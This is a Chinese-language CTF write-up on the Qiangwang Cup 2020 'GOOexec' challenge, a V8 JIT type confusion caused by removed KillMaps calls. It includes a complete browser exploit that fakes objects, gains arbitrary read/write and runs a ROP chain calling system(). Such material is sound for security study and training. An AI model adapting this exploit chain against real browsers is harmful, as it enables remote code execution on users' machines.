> 原文链接: https://www.anquanke.com//post/id/224195 


# 强网杯2020决赛RealWord的Chrome逃逸——GOOexec（GOO）


                                阅读量   
                                **237524**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t0192a8545633aef27e.jpg)](https://p4.ssl.qhimg.com/t0192a8545633aef27e.jpg)



## 0x00 前言

刚开始接触v8方面的漏洞利用，就从这题分享一下我学习的过程。



## 0x01 前置知识

### <a class="reference-link" name="JIT"></a>JIT

简单来说，JS引擎在解析javascript代码时，如果发现js里有段代码一直在做重复的类似操作，比如一个循环语句，且重复次数超过某个阈值，那么就会将这段JS代码翻译为本机的汇编代码，以提高代码的执行速度，这就叫JIT优化，如下的js代码可以触发v8的JIT优化

```
for (var i=0;i&lt;0x20000;i++) `{`

`}`
```

使用`./d8 1.js -print-opt-code`，可以查看JIT代码

[![](https://p3.ssl.qhimg.com/t0175e2f1a01ae0f8a7.png)](https://p3.ssl.qhimg.com/t0175e2f1a01ae0f8a7.png)

### <a class="reference-link" name="MAP"></a>MAP

map是一个对象，在v8里，每一个js对象内部都有一个map对象指针，v8通过map的值来判断这个js对象到底是哪种类型。

### <a class="reference-link" name="%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%EF%BC%88Type%20Confusion%EF%BC%89"></a>类型混淆（Type Confusion）

如果map的类型发生错误，将会发生类型混淆，比如原本一个存double数值的数组对象，map变成了对象数组的类型，那么再次访问其元素时，取出的不再是一个double值，而是该double值作为地址指向的对象。因此可以用来伪造对象，只需伪造一个ArrayBuffer对象，即可实现任意地址读写。类型混淆往往跟JIT编译后的代码有关，某些情况下JIT即时编译的代码里的判断条件可能考虑的不充分便会发生类型混淆。

### <a class="reference-link" name="V8%E7%9A%84%E6%95%B0%E7%BB%84"></a>V8的数组

V8的数组是一个对象，其条目仍然是一个对象，数据存在条目对象的里，如果是`DOUBLE_ELEMENTS`类型，则element对象的数据区直接保存这个double值(64位)，如果是其他类型，则将数据包装为一个对象，element对象的数据区将保存这个对象的地址。<br>
element的类型当中，以`PACKED`开头的代表这是一个`密集型数组(快数组)`；以`HOLEY`开头的数组为`稀疏数组(慢数组)`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01e6a462ba6340cf99.png)

数组常见的几种element类型变化情况如下，类型变化只能沿着箭头方向进行，一旦从一种类型变为另一种类型，就不能再逆回去了。

[![](https://p1.ssl.qhimg.com/t01c3ae783356c112c4.png)](https://p1.ssl.qhimg.com/t01c3ae783356c112c4.png)

#### <a class="reference-link" name="Array(0)%E5%92%8Cnew%20Array(0)%E5%92%8C%5B%5D%E7%9A%84%E5%8C%BA%E5%88%AB"></a>Array(0)和new Array(0)和[]的区别

使用如下代码测试

```
var a = Array(0);
%DebugPrint(a);
var b = new Array(0);
%DebugPrint(b);
var c = [];
%DebugPrint(c);
```

测试结果

```
Array(0): 0x15ed08148565: [JSArray]
 - map: 0x15ed083038d5 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x15ed082cb529 &lt;JSArray[0]&gt;
 - elements: 0x15ed080426dd &lt;FixedArray[0]&gt; [HOLEY_SMI_ELEMENTS]
 - length: 0
 - properties: 0x15ed080426dd &lt;FixedArray[0]&gt; `{`
    0x15ed08044649: [String] in ReadOnlySpace: #length: 0x15ed08242159 &lt;AccessorInfo&gt; (const accessor descriptor)
 `}`

new Array(0): 0x15ed08148575: [JSArray]
 - map: 0x15ed083038d5 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x15ed082cb529 &lt;JSArray[0]&gt;
 - elements: 0x15ed080426dd &lt;FixedArray[0]&gt; [HOLEY_SMI_ELEMENTS]
 - length: 0
 - properties: 0x15ed080426dd &lt;FixedArray[0]&gt; `{`
    0x15ed08044649: [String] in ReadOnlySpace: #length: 0x15ed08242159 &lt;AccessorInfo&gt; (const accessor descriptor)
 `}`

[]: 0x15ed08148585: [JSArray]
 - map: 0x15ed0830385d &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x15ed082cb529 &lt;JSArray[0]&gt;
 - elements: 0x15ed080426dd &lt;FixedArray[0]&gt; [PACKED_SMI_ELEMENTS]
 - length: 0
 - properties: 0x15ed080426dd &lt;FixedArray[0]&gt; `{`
    0x15ed08044649: [String] in ReadOnlySpace: #length: 0x15ed08242159 &lt;AccessorInfo&gt; (const accessor descriptor)
 `}`
```

我们看到，Array(0)和new Array(0)产生的对象在`不考虑JIT的情况下`是一样的，而[]类型为PACKED_SMI_ELEMENTS，如果考虑了JIT，那么情况会变得复杂，稍后的题中将遇到这种情况。



## 0x02 漏洞分析

### <a class="reference-link" name="%E5%88%87%E5%85%A5%E7%82%B9"></a>切入点

题目给了我们一个diff文件，以及经过patch后编译的chrome浏览器和v8引擎。其中diff文件如下

```
diff --git a/src/compiler/load-elimination.cc b/src/compiler/load-elimination.cc
index ff79da8c86..8effdd6e15 100644
--- a/src/compiler/load-elimination.cc
+++ b/src/compiler/load-elimination.cc
@@ -866,8 +866,8 @@ Reduction LoadElimination::ReduceTransitionElementsKind(Node* node) `{`
     if (object_maps.contains(ZoneHandleSet&lt;Map&gt;(source_map))) `{`
       object_maps.remove(source_map, zone());
       object_maps.insert(target_map, zone());
-      AliasStateInfo alias_info(state, object, source_map);
-      state = state-&gt;KillMaps(alias_info, zone());
+      // AliasStateInfo alias_info(state, object, source_map);
+      // state = state-&gt;KillMaps(alias_info, zone());
       state = state-&gt;SetMaps(object, object_maps, zone());
     `}`
   `}` else `{`
@@ -892,7 +892,7 @@ Reduction LoadElimination::ReduceTransitionAndStoreElement(Node* node) `{`
   if (state-&gt;LookupMaps(object, &amp;object_maps)) `{`
     object_maps.insert(double_map, zone());
     object_maps.insert(fast_map, zone());
-    state = state-&gt;KillMaps(object, zone());
+    // state = state-&gt;KillMaps(object, zone());
     state = state-&gt;SetMaps(object, object_maps, zone());
   `}`
   // Kill the elements as well.
```

首先，patch点出现在`ReduceTransitionElementsKind`和`ReduceTransitionAndStoreElement`函数中，从源文件路径知道这个类跟JIT编译器有关，在某些情况下会影响到编译出的代码。经过个人的研究，发现 `ReduceTransitionElementsKind`的作用是为了加快`elements`的类型转换，如果在一段会被JIT优化的js代码段中对数组的element进行类型转换操作，就会调用这个函数来构建相关的汇编代码。

### <a class="reference-link" name="%E5%B0%8F%E5%AE%9E%E9%AA%8C"></a>小实验

首先`b ReduceTransitionElementsKind`和`bReduceTransitionAndStoreElement`设置断点，运行如下的测试代码

```
var a;
for (var i=0;i&lt;0x2000;i++) `{`
   a = Array(0);
   a[0] = 1.1;
`}`
```

发现确实能够断下来，我们再试试这两段代码，发现都不能下断

```
var a;
for (var i=0;i&lt;0x2000;i++) `{`
   a = new Array(0);
   a[0] = 1.1;
`}`
```

```
var a;
for (var i=0;i&lt;0x20000;i++) `{`
   a = [];
   a[0] = 1.1;
`}`
```

为了解释其中的原因，我们查看一下JIT的汇编代码（截取部分）<br>
第一段js代码的JIT汇编中，Array(0)的创建过程

```
0x33ea00084f47    87  49b8e80d0beb79550000 REX.W movq r8,0x5579eb0b0de8    ;; external reference (Heap::NewSpaceAllocationTopAddress())
0x33ea00084f51    91  4d8b08         REX.W movq r9,[r8]
0x33ea00084f54    94  4d8d5910       REX.W leaq r11,[r9+0x10]
0x33ea00084f58    98  49bcf00d0beb79550000 REX.W movq r12,0x5579eb0b0df0    ;; external reference (Heap::NewSpaceAllocationLimitAddress())
0x33ea00084f62    a2  4d391c24       REX.W cmpq [r12],r11
0x33ea00084f66    a6  0f8606020000   jna 0x33ea00085172  &lt;+0x2b2&gt;
0x33ea00084f6c    ac  4d8d5910       REX.W leaq r11,[r9+0x10]
0x33ea00084f70    b0  4d8918         REX.W movq [r8],r11
0x33ea00084f73    b3  4983c101       REX.W addq r9,0x1
0x33ea00084f77    b7  41bb5d383008   movl r11,0x830385d      ;; (compressed) object: 0x33ea0830385d &lt;Map(PACKED_SMI_ELEMENTS)&gt;
0x33ea00084f7d    bd  458959ff       movl [r9-0x1],r11
0x33ea00084f81    c1  4d8bb550010000 REX.W movq r14,[r13+0x150] (root (empty_fixed_array))
0x33ea00084f88    c8  45897103       movl [r9+0x3],r14
0x33ea00084f8c    cc  45897107       movl [r9+0x7],r14
0x33ea00084f90    d0  41c7410b00000000 movl [r9+0xb],0x0
0x33ea00084f98    d8  49bf89252d08ea330000 REX.W movq r15,0x33ea082d2589    ;; object: 0x33ea082d2589 &lt;PropertyCell name=0x33ea080c91a9 &lt;String[1]: #a&gt; value=0x33ea08383dd5 &lt;JSArray[1]&gt;&gt;
0x33ea00084fa2    e2  45894f0b       movl [r15+0xb],r9
```

可以看到，在这里，Array(0)初始为了`PACKED_SMI_ELEMENTS`类型的数组，因此对其条目赋予double值时，会发生类型转换。<br>
接下来，我们看第二段js代码的JIT代码中创建new Array(0)的部分

```
0x57300084f47    87  49b8e83d22e5f8550000 REX.W movq r8,0x55f8e5223de8    ;; external reference (Heap::NewSpaceAllocationTopAddress())
0x57300084f51    91  4d8b08         REX.W movq r9,[r8]
0x57300084f54    94  4d8d5910       REX.W leaq r11,[r9+0x10]
0x57300084f58    98  49bcf03d22e5f8550000 REX.W movq r12,0x55f8e5223df0    ;; external reference (Heap::NewSpaceAllocationLimitAddress())
0x57300084f62    a2  4d391c24       REX.W cmpq [r12],r11
0x57300084f66    a6  0f86b5010000   jna 0x57300085121  &lt;+0x261&gt;
0x57300084f6c    ac  4d8d5910       REX.W leaq r11,[r9+0x10]
0x57300084f70    b0  4d8918         REX.W movq [r8],r11
0x57300084f73    b3  4983c101       REX.W addq r9,0x1
0x57300084f77    b7  41bb25393008   movl r11,0x8303925       ;; (compressed) object: 0x057308303925 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;
0x57300084f7d    bd  458959ff       movl [r9-0x1],r11
0x57300084f81    c1  4d8bb550010000 REX.W movq r14,[r13+0x150] (root (empty_fixed_array))
0x57300084f88    c8  45897103       movl [r9+0x3],r14
0x57300084f8c    cc  45897107       movl [r9+0x7],r14
0x57300084f90    d0  41c7410b00000000 movl [r9+0xb],0x0
0x57300084f98    d8  49bf8d252d0873050000 REX.W movq r15,0x573082d258d    ;; object: 0x0573082d258d &lt;PropertyCell name=0x0573080c91a9 &lt;String[1]: #a&gt; value=0x057308373935 &lt;JSArray[1]&gt;&gt;
```

可以看到，new Array(0)一开始就是`HOLEY_DOUBLE_ELEMENTS`类型，可以满足a[0] = 1.1的操作，不需要再做类型转换。<br>
接下来，我们看第三段js代码的JIT代码中创建[]的部分，发现[]一开始就是`PACKED_DOUBLE_ELEMENTS`类型，可以满足a[0] = 1.1的操作，不需要再做类型转换。

```
0x30bd00084f47    87  49b8e80d40d4c6550000 REX.W movq r8,0x55c6d4400de8    ;; external reference (Heap::NewSpaceAllocationTopAddress())
0x30bd00084f51    91  4d8b08         REX.W movq r9,[r8]
0x30bd00084f54    94  4d8d5910       REX.W leaq r11,[r9+0x10]
0x30bd00084f58    98  49bcf00d40d4c6550000 REX.W movq r12,0x55c6d4400df0    ;; external reference (Heap::NewSpaceAllocationLimitAddress())
0x30bd00084f62    a2  4d391c24       REX.W cmpq [r12],r11
0x30bd00084f66    a6  0f8695010000   jna 0x30bd00085101  &lt;+0x241&gt;
0x30bd00084f6c    ac  4d8d5910       REX.W leaq r11,[r9+0x10]
0x30bd00084f70    b0  4d8918         REX.W movq [r8],r11
0x30bd00084f73    b3  4983c101       REX.W addq r9,0x1
0x30bd00084f77    b7  41bbfd383008   movl r11,0x83038fd      ;; (compressed) object: 0x30bd083038fd &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt;
0x30bd00084f7d    bd  458959ff       movl [r9-0x1],r11
0x30bd00084f81    c1  4d8bb550010000 REX.W movq r14,[r13+0x150] (root (empty_fixed_array))
0x30bd00084f88    c8  45897103       movl [r9+0x3],r14
0x30bd00084f8c    cc  45897107       movl [r9+0x7],r14
0x30bd00084f90    d0  41c7410b00000000 movl [r9+0xb],0x0
0x30bd00084f98    d8  49bf81252d08bd300000 REX.W movq r15,0x30bd082d2581    ;; object: 0x30bd082d2581 &lt;PropertyCell name=0x30bd080c91a9 &lt;String[1]: #a&gt; value=0x30bd083c4e5d &lt;JSArray[1]&gt;&gt;
```

#### <a class="reference-link" name="%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93"></a>实验总结

从上面的实验来看，数组的elements类型在JIT下和普通js下是不一样的，JIT会对其进行优化。其中如果是`new Array(0)`和`[]`创建的数组，那么其数组的elements初始时的类型就已经是目标数据的类型了。因此就不需要再调用`ReduceTransitionElementsKind`和`ReduceTransitionAndStoreElement`进行类型转换。因此在利用中，我们应该使用Array(0)的方式来创建数组。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

patch了`AliasStateInfo alias_info(state, object, source_map);`和`state = state-&gt;KillMaps(object, zone());`，我们先来看看`KillMaps`的源码

```
LoadElimination::AbstractState const* LoadElimination::AbstractState::KillMaps(
    const AliasStateInfo&amp; alias_info, Zone* zone) const `{`
  if (this-&gt;maps_) `{`
    AbstractMaps const* that_maps = this-&gt;maps_-&gt;Kill(alias_info, zone);
    if (this-&gt;maps_ != that_maps) `{`
      AbstractState* that = new (zone) AbstractState(*this);
      that-&gt;maps_ = that_maps;
      return that;
    `}`
  `}`
  return this;
`}`
```

继续看`Kill`的源码,如果有两个node指向同一个对象，则创建了新map。

```
LoadElimination::AbstractElements const*
LoadElimination::AbstractElements::Kill(Node* object, Node* index,
                                        Zone* zone) const `{`
  for (Element const element : this-&gt;elements_) `{`
    if (element.object == nullptr) continue;
    if (MayAlias(object, element.object)) `{` //如果有两个node指向同一个对象
      AbstractElements* that = new (zone) AbstractElements(zone);
      for (Element const element : this-&gt;elements_) `{`
        if (element.object == nullptr) continue;
        DCHECK_NOT_NULL(element.index);
        DCHECK_NOT_NULL(element.value);
        if (!MayAlias(object, element.object) ||
            !NodeProperties::GetType(index).Maybe(
                NodeProperties::GetType(element.index))) `{`
          that-&gt;elements_[that-&gt;next_index_++] = element;
        `}`
      `}`
      that-&gt;next_index_ %= arraysize(elements_);
      return that;
    `}`
  `}`
  return this;
`}`
```

从上面的源码来看，如果有`两个node指向的是同一个对象`，那么`state = state-&gt;KillMaps(object, zone());`就会更新两个node的checkmap，这样后续生成JIT代码时，用不同的node去操作源对象也不会发生问题。为了进一步验证猜想，我们用gdb调试一下。<br>
gdb设置参数，其中—no-enable-slow-asserts是为了能够使用`p state-&gt;Print()`来查看checkmaps的信息，否则会报错。

```
set args --allow-natives-syntax ./3.js --no-enable-slow-asserts
```

测试代码

```
function opt(a,b) `{` 
   a[0] = 1.1;
   b[0] = 1.1;
   a[0] = `{``}`;
   b[0] = 1.1;
`}`

var a;

for (var i=0;i&lt;0x2000;i++) `{` 
   a = Array(0);
   opt(a,a);
`}`
a = Array(0);
opt(a,a);
print(a[0]);
```

执行SetMaps之前，因为有`a[0] = 1.1;b[0] = 1.1;`，所以它们之前已经是`HOLEY_DOUBLE_ELEMENTS`类型

[![](https://p3.ssl.qhimg.com/t0153ed9e03c4e29128.png)](https://p3.ssl.qhimg.com/t0153ed9e03c4e29128.png)

执行之后，由于没有KillMaps，因此b仍然保留为`HOLEY_DOUBLE_ELEMENTS`类型

[![](https://p3.ssl.qhimg.com/t01cb967de84df402c6.png)](https://p3.ssl.qhimg.com/t01cb967de84df402c6.png)

如果接下来执行`b[0] = 1.1;`，按理来说是以`HOLEY_DOUBLE_ELEMENTS`的方式向elements里写了一个double值，由于它指向的对象已经变成了`HOLEY_ELEMENTS`类型，那么再次从中取元素时，double值被当成对象指针对待，因此通过控制double值，能够使得取出的值作为指针能正好指向我们可控的内存区，那么我们就可以伪造对象了。<br>
然而实际情况是，执行`b[0] = 1.1;`时，仍然是以`HOLEY_ELEMENTS`的方式写入，即将1.1包装为一个HeapNumber，然后保存指针到elements。在JIT编译的时候,末尾的两句`a[0] = `{``}`;`和`b[0] = 1.1;`不能同时出现，否则JIT编译器收集到的信息比较充分会使得漏洞利用失败，因此应该想办法让这两句的编译时期分开，由此可以加一个条件判断，这样，两句在编译时期不会同时出现。

```
function opt(a,b,f1,f2) `{`
   a[0] = 1.1;
   b[0] = 1.1;
   if (f1)
      a[0] = `{``}`;
   if (f2)
      b[0] = 1.1;
`}`

var a;

for (var i=0;i&lt;0x2000;i++) `{`
   a = Array(0);
   opt(a,a,true,false);
   a = Array(0);
   opt(a,a,false,true);
`}`

a = Array(0);
opt(a,a,true,true);
print(a[0]);
```

通过`%DebugPrint(a)`查看对象a

```
DebugPrint: 0x2aa8083dc8e1: [JSArray]
 - map: 0x2aa808303975 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x2aa8082cb529 &lt;JSArray[0]&gt;
 - elements: 0x2aa8083dc99d &lt;FixedArray[17]&gt; [HOLEY_ELEMENTS]
 - length: 1
 - properties: 0x2aa8080426dd &lt;FixedArray[0]&gt; `{`
    0x2aa808044649: [String] in ReadOnlySpace: #length: 0x2aa808242159 &lt;AccessorInfo&gt; (const accessor descriptor)
 `}`
 - elements: 0x2aa8083dc99d &lt;FixedArray[17]&gt; `{`
           0: -858993459
pwndbg&gt; dd 0x2aa8083dc99c
00002aa8083dc99c     080424a5 00000022 9999999a 3ff19999
00002aa8083dc9ac     080423a1 080423a1 080423a1 080423a1
00002aa8083dc9bc     080423a1 080423a1 080423a1 080423a1
00002aa8083dc9cc     080423a1 080423a1 080423a1 080423a1
```

可以看到，1.1这个double值被误认为是对象指针，由此可以伪造对象。

### <a class="reference-link" name="JIT%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"></a>JIT代码分析

首先poc的前面一大部分操作都是为了生成有问题的JIT代码，`LoadElimination::ReduceTransitionElementsKind`是在编译器编译时调用的，而不是JIT代码运行时调用的。JIT编译完成后就不需要再调用这个进行转换了，因为转换的操作已经固化成汇编的形式了。如下是截取的有问题的JIT代码（关键部分）

```
0x353900085199   2d9  45398528010000 cmpl [r13+0x128] (root (heap_number_map)),r8
0x3539000851a0   2e0  0f84b1010000   jz 0x353900085357  &lt;+0x497&gt;
0x3539000851a6   2e6  453985a8010000 cmpl [r13+0x1a8] (root (bigint_map)),r8
0x3539000851ad   2ed  0f8492010000   jz 0x353900085345  &lt;+0x485&gt;
0x3539000851b3   2f3  8b4f07         movl rcx,[rdi+0x7]
0x3539000851b6   2f6  4903cd         REX.W addq rcx,r13
0x3539000851b9   2f9  c5fb114107     vmovsd [rcx+0x7],xmm0
0x3539000851be   2fe  488be5         REX.W movq rsp,rbp
0x3539000851c1   301  5d             pop rbp
0x3539000851c2   302  c22800         ret 0x28
```

我们再看一下在正常的v8引擎中相同部分编译的JIT代码

```
0x320a00084f30    70  48b9253930080a320000 REX.W movq rcx,0x320a08303925    ;; object: 0x320a08303925 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;
................................................................
0x320a0008519d   2dd  4539a528010000 cmpl [r13+0x128] (root (heap_number_map)),r12
0x320a000851a4   2e4  0f84da010000   jz 0x320a00085384  &lt;+0x4c4&gt;
0x320a000851aa   2ea  4539a5a8010000 cmpl [r13+0x1a8] (root (bigint_map)),r12
0x320a000851b1   2f1  0f84ba010000   jz 0x320a00085371  &lt;+0x4b1&gt;
0x320a000851b7   2f7  394fff         cmpl [rdi-0x1],rcx
0x320a000851ba   2fa  0f858c020000   jnz 0x320a0008544c  &lt;+0x58c&gt;
0x320a000851c0   300  8b4f07         movl rcx,[rdi+0x7]
0x320a000851c3   303  4903cd         REX.W addq rcx,r13
0x320a000851c6   306  c5fb114107     vmovsd [rcx+0x7],xmm0
0x320a000851cb   30b  488b4de8       REX.W movq rcx,[rbp-0x18]
0x320a000851cf   30f  488be5         REX.W movq rsp,rbp
0x320a000851d2   312  5d             pop rbp
0x320a000851d3   313  4883f904       REX.W cmpq rcx,0x4
0x320a000851d7   317  7f03           jg 0x320a000851dc  &lt;+0x31c&gt;
0x320a000851d9   319  c22800         ret 0x28
```

可以知道，漏洞的v8的JIT编译的代码正是因为少了这一句map类型的比较，从而导致了类型混淆。

```
0x320a000851b7   2f7  394fff         cmpl [rdi-0x1],rcx
```

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

现在的v8存在指针压缩机制(pointer compression)，在这种机制下，指针都用4字节来表示，即将指针的基址单独仅存储一次，然后每个指针只需存后4字节即可，因为前2字节一样，这样可以节省空间。这种机制下，堆地址是可以预测的，我们可以申请一个较大的堆空间，这样它的地址在同一台机子上就很稳定基本不变（会随系统的内存以及其他一些配置变化），在不同机子上有微小变化，可以枚举爆破。<br>
只需要伪造一个ArrayBuffer，即可实现任意地址读写，由于本题的v8是linux下的，因此比较好利用，直接泄露栈地址然后劫持栈做ROP即可。

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;body&gt;
    &lt;script&gt;
function opt(a,b,f1,f2)
`{`
    a[0] = 1.1;
    b[0] = 1.1;
    if (f1)
        a[0] = `{``}`;
    if (f2)
        b[0] = 1.9035980891199164e+185; //这个浮点数在内存里的表示指向了faker[1]，因此，我们可以在faker[1]处开始伪造对象
`}`


//申请一个大的Array，由于V8的compression ptr，其地址低四字节稳定
const faker = new Array(0x10000);
faker.fill(4.765139213524301e-270);

var buf = new ArrayBuffer(0x10000);
var dv = new DataView(buf);
dv.setUint32(0,0xABCDEF78,true);

//将一个32位整数打包位64位浮点数
function p64(val) `{`
   dv.setUint32(0x8,val &amp; 0xFFFFFFFF,true);
   dv.setUint32(0xC,val &gt;&gt; 32,true);
   var float_val = dv.getFloat64(0x8,true);
   return float_val;
`}`

//将两个32位整数打包为一个64位浮点数
function p64(low4,high4) `{`
   dv.setUint32(0x8,low4,true);
   dv.setUint32(0xC,high4,true);
   var float_val = dv.getFloat64(0x8,true);
   return float_val;
`}`

//解包64位浮点数的低四字节
function u64_l(val) `{`
   dv.setFloat64(0x8,val,true);
   return dv.getUint32(0x8,true);
`}`

//解包64位浮点数的高四字节
function u64_h(val) `{`
   dv.setFloat64(0x8,val,true);
   return dv.getUint32(0xC,true);
`}`

//伪造一个FixedJSArray对象用于构造addressOf和fakeObject原语
faker[1] = p64(0x082031cd,0x080426dd);
faker[2] = p64(0x08342135,0x2);
//伪造FixedJSArray的element
faker[3] = p64(0x080424a5,0x2);

//强制触发JIT编译，生成有漏洞的代码
let a;
for (let i = 0; i &lt; 0x200000; i++)
`{`
    a = Array(0);
    opt(a,a,true,false);
    a = Array(0);
    opt(a,a,false,true);
`}`
//调用有漏洞的JIT代码，使得对象a发生类型混淆
a = Array(0);
opt(a,a,true,true);

function addressOf(obj) `{`
   var o = a[0];
   o[0] = obj;
   return u64_l(faker[4]) - 1;
`}`

function fakeObject(addr_to_fake) `{`
   var o = a[0];
   faker[4] = p64(addr_to_fake + 1);
   return o[0];
`}`

function isInt(obj) `{`
   return obj % 1 === 0;
`}`

var buf_addr = addressOf(buf);
//alert("buf_addr="+buf_addr.toString(16));
var backing_store_ptr = buf_addr + 0x14 + 0x8;
//伪造一个ArrayBuffer用于任意地址读写
faker[5] = p64(0,0x08202dbd);
faker[6] = p64(0x080426dd,0x080426dd);
faker[7] = p64(0xffffffff,0);
faker[8] = p64(0,0);
faker[9] = p64(0,2);

//伪造一个FixedDoubleArray用于泄露地址，因为最开始，我们不知道compression ptr的高4字节是什么，因此用FixedDoubleArray可以进行相对寻址，从而泄露数据
faker[10] = p64(0,0x0820317d);
faker[11] = p64(0x080426dd,0x08342181)
faker[12] = p64(0x7ffffffe,0x08042a31);
faker[13] = p64(0x7ffffffe,0)

//注意内存对齐
if (parseInt(backing_store_ptr &amp; 0xf) == 0x4 || parseInt(backing_store_ptr &amp; 0xf) == 0xc) `{`
   faker[15] = p64(0x08042a31,0x7ffffffe);
   faker[11] = p64(0x080426dd,0x08342195)
`}`

//获得伪造的对象
var arb_bufferArray = fakeObject(0x08342148);
var fake_doubleArr = fakeObject(0x08342170);

var offset;
if (parseInt(backing_store_ptr &amp; 0xf) == 0x4 || parseInt(backing_store_ptr &amp; 0xf) == 0xc) `{`
   offset = (0xFFFFFFFF - 0x0834219b + backing_store_ptr) / 8;
`}` else `{`
   offset = (0xFFFFFFFF - 0x08342187 + backing_store_ptr) / 8;
`}`
//泄露buf对象里的数据
var v = fake_doubleArr[offset];
//alert("offset="+offset.toString(16));
//alert("heap_addr=" + u64_h(v).toString(16) + u64_l(v).toString(16));

//伪造ArrayBuffer的backing_store，从而实现任意地址读写
faker[8] = p64(u64_l(v) + 0x10,u64_h(v));
var fdv = new DataView(arb_bufferArray);
var heap_t_l = fdv.getUint32(0,true);
var heap_t_h =fdv.getUint32(4,true);

//泄露libv8.so的地址
faker[8] = p64(heap_t_l,heap_t_h);
var elf_addr_l = fdv.getUint32(0,true);
var elf_addr_h = fdv.getUint32(4,true);
var elf_base_l = elf_addr_l - 0xeb4028;
var elf_base_h = elf_addr_h;

//alert("elf_base=" + elf_base_h.toString(16) + elf_base_l.toString(16));
var strlen_got_l = elf_base_l + 0xEF4DB8;
var free_got_l = elf_base_l + 0xEF7A18;
//0x0000000000b9ac48 : mov rdi, qword ptr [r13 + 0x20] ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x30]
var mov_rdi = elf_base_l + 0xb9ac48;
//0x000000000076039f : mov rdx, qword ptr [rax] ; mov rax, qword ptr [rdi] ; mov rsi, r13 ; call qword ptr [rax + 0x10]
var mov_rdx = elf_base_l + 0x76039f;
var pop_rdi = elf_base_l + 0x6010bb;
//泄露libc地址
faker[8] = p64(strlen_got_l,elf_base_h);
var strlen_addr_l = fdv.getUint32(0,true);
var strlen_addr_h = fdv.getUint32(4,true);

var libc_base_l = strlen_addr_l - 0x18b660;
var libc_base_h = strlen_addr_h;
var mov_rsp_rdx_l = libc_base_l + 0x5e650;
var environ_ptr_addr_l = libc_base_l + 0x1EF2E0;
var system_l = libc_base_l + 0x55410;
//alert("libc_base=" + libc_base_h.toString(16) + libc_base_l.toString(16));
//alert("system_l=" + libc_base_h.toString(16) + system_l.toString(16));
//泄露栈地址
faker[8] = p64(environ_ptr_addr_l,libc_base_h);
var stack_addr_l = fdv.getUint32(0,true);
var stack_addr_h = fdv.getUint32(4,true);
//alert("stack_addr="+stack_addr_h.toString(16) + stack_addr_l.toString(16));

faker[8] = p64(u64_l(v) + 0x80,u64_h(v));
heap_t_l = fdv.getUint32(0,true);
heap_t_h =fdv.getUint32(4,true);

if (parseInt(heap_t_h) == 0) `{`
   location.reload();
`}` else `{`
   //泄露compression ptr的高4字节数据
   faker[8] = p64(heap_t_l,heap_t_h);
   var compression_ptr_high = fdv.getUint32(4,true);
   //alert("compression_ptr_high="+compression_ptr_high.toString(16));
   //泄露buf的数据区地址
   v = fake_doubleArr[offset - 1];
   var buf_data_addr_l = u64_l(v);
   var buf_data_addr_h = u64_h(v);
   //在数据区布下ROP等
   dv.setFloat64(0,p64(buf_data_addr_l+0x10,buf_data_addr_h),true);
   dv.setFloat64(0x40,p64(mov_rdx,elf_base_h),true);
   dv.setFloat64(0x20,p64(mov_rsp_rdx_l,libc_base_h),true);
   //rsp
   dv.setFloat64(0x10,p64(buf_data_addr_l+0x2000,buf_data_addr_h),true);

   //rop
   dv.setFloat64(0x2000,p64(pop_rdi,elf_base_h),true);
   dv.setFloat64(0x2008,p64(buf_data_addr_l+0x2018,buf_data_addr_h),true);
   dv.setFloat64(0x2010,p64(system_l,libc_base_h),true)
   var cmd = "gnome-calculator\x00";
   var bufView = new Uint8Array(buf);
   for (var i = 0, strlen = cmd.length; i &lt; strlen; i++) `{`
      bufView[0x2018+i] = cmd.charCodeAt(i);
   `}`

   //修改0x20处为buf_data_addr
   faker[8] = p64(0x20,compression_ptr_high);
   fdv.setFloat64(0,p64(buf_data_addr_l,buf_data_addr_h),true);

   //劫持栈返回地址为mov_rdi，将栈最终迁移到buf_data_addr里做ROP
   var rop_addr_l = stack_addr_l - 0x1b18;
   faker[8] = p64(rop_addr_l,stack_addr_h);
   fdv.setFloat64(0,p64(mov_rdi,elf_base_h),true);
`}`
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
```



## 0x03 感想

通过这一题，学习了v8方面的很多知识，对JIT也有了一定的了解



## 0x04 参考

[强网杯2020线下GooExec](https://bbs.pediy.com/thread-262205.htm)<br>[你可能不知道的v8数组优化](https://segmentfault.com/a/1190000023193375)<br>[深入理解Js数组](https://blog.csdn.net/qq_40413670/article/details/106738425)<br>[(v8 source)elements-kind.h](https://source.chromium.org/chromium/v8/v8.git/+/ec37390b2ba2b4051f46f153a8cc179ed4656f5d:src/elements-kind.h;l=14)<br>[Google Chrome V8 JIT – ‘LoadElimination::ReduceTransitionElementsKind’ Type Confusion](https://www.anquanke.com/vul/id/1069139)
